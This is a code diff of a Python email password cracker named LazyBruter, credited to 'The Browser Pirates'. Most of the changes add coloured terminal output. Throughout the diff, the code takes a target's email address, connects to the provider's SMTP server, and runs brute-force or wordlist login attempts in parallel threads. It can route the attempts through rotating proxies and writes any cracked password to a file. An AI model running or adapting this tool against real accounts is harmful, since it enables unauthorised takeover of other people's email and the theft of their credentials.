@@ -3,6 +3,8 @@ import itertools
 import os
 from time import sleep
 from threading import *
+from colorama import init
+init()
 
 print("         _                           ______                                 ")
 print("	| |                         (____  \             _               ")
@@ -14,17 +16,17 @@ print("	                   (____/                                      ")
 																															  
 print		("\nThis tool is a bruter tool that is meant to crack email password.")
 print                    ("[+] Coded by The Browser Pirates [+]")
-
 #all data input begins here	
-proxyconfirm = input ("\nDo you want to enable proxy? [y/n]")
+proxyconfirm = input ('Do you want to enable proxy? [y/n]: ')
 if proxyconfirm == "y":
-	print ("Opening a new shell to generate proxies...")
+	print ('\033[32m'+"Opening a new shell to generate proxies...")
 	os.system('start cmd /D /C "py proxychanger.py"')
 	
 if proxyconfirm == "n":
-    print("Proxies not activated.")
+    print('\033[31m' + 'Proxies not activated.')
     pass
-user = input("\nEnter Target's Email Address: ")	
+print('\033[39m')
+user = input("Enter Target's Email Address: ")	
 if 'gmail' in user:
     server = "gmail"
     port = 587
@@ -38,7 +40,8 @@ else:
     server = input ("Enter Email Service name [ex: gmail]: ")
     port = int(input("Enter the SMTP port [default: 587]: "))
 
-print("Connecting...")
+print('\033[35m' +"Connecting...")
+print('\033[37m')
 smtpserver_server = smtplib.SMTP("smtp."+server+".com",port)
 smtpserver_server.ehlo()
 smtpserver_server.starttls()
@@ -48,7 +51,8 @@ print("Connected to SMTP server. Ready to perform an attack.")
 method = input("\nChoose method to attack => (a)Brute Force (b)Dictionary : ")
 if method == "a":
     min_pass = int(input("Enter the minimum number of password you want to start the Brute-Force(Default:8): "))
-    print ("\nYou are about to attack this email: ",user)
+    print ("\nYou are about to attack this email: "+'\033[43m'+user)
+    print('\033[37m')
     verify2 = input ("Do you want to continue? [y/n]: ")
     if verify2 == "y" or verify2 == "Y":
         def print_perms(chars, minlen, maxlen): 
@@ -61,7 +65,8 @@ if method == "a":
     for password in print_perms:
         try:
             smtpserver_server.login(user, password)
-            print ("[+] Password Cracked: ", password)
+            print ('\033[33m'+"[+] Password Cracked: "+'\033[34m'+ password)
+            print('\033[39m')
             input("Press Enter to save the result in .txt")
             file = open("password cracked.txt","w")
             file.write("Email: ")
@@ -75,7 +80,7 @@ if method == "a":
             break
 			
         except smtplib.SMTPAuthenticationError:
-            print ("[!] Password Inccorect: ", password)
+            print ('\033[31m'+"[!] Password Inccorect: "+'\033[32m'+ password)
 			
     if verify2 == "n" or verify2 == "N":   
         quit()
@@ -86,26 +91,8 @@ class Core1(Thread):
         for password in passwfile:
             try:
                 smtpserver_server.login(user, password)
-                print ("[+] Password Found: ", password)
-                input("Press Enter to save the result in .txt")
-                file = open("password cracked.txt","w")
-                file.write("Email: ")
-                file.write(user)
-                file.write("    Password: ")
-                file.write(password)
-                file.close()
-                input("Password saved! Search for <password cracked.txt> in LazyBruter Folder")
-                break
-				
-            except smtplib.SMTPAuthenticationError:
-                print ("[!] Trying password: ", password)
-
-class Core2(Thread):		
-    def run(self):
-        for password in reversedpasswfile:
-            try:
-                smtpserver_server.login(user, password)
-                print ("[+] Password Found: ", password)
+                print ('\033[33m'+"[+] Password Cracked: "+'\033[34m'+ password)
+                print('\033[39m')
                 input("Press Enter to save the result in .txt")
                 file = open("password cracked.txt","w")
                 file.write("Email: ")
@@ -119,7 +106,29 @@ class Core2(Thread):
                 break
 				
             except smtplib.SMTPAuthenticationError:
-                print ("[!] Trying password: ", password)
+                print ('\033[31m'+"[!] Incorrect Password: "+ password)
+
+class Core2(Thread):		
+    def run(self):
+        for password in reversedpasswfile:
+            try:
+                smtpserver_server.login(user, password)
+                print ('\033[33m'+"[+] Password Cracked: "+'\033[34m'+ password)
+                print('\033[39m')
+                input("Press Enter to save the result in .txt")
+                file = open("password cracked.txt","w")
+                file.write("Email: ")
+                file.write(user)
+                file.write("    Password: ")
+                file.write(password)
+                file.close()
+                input("Password saved! Search for <password cracked.txt> in LazyBruter Folder")
+                t1.join()
+                t2.join()
+                break
+				
+            except smtplib.SMTPAuthenticationError:
+                print ('\033[31m'+"[!] Incorrect Password: "+ password)
 
 if method == "b":
     passwfile = input("Enter the Wordlist Path: ")
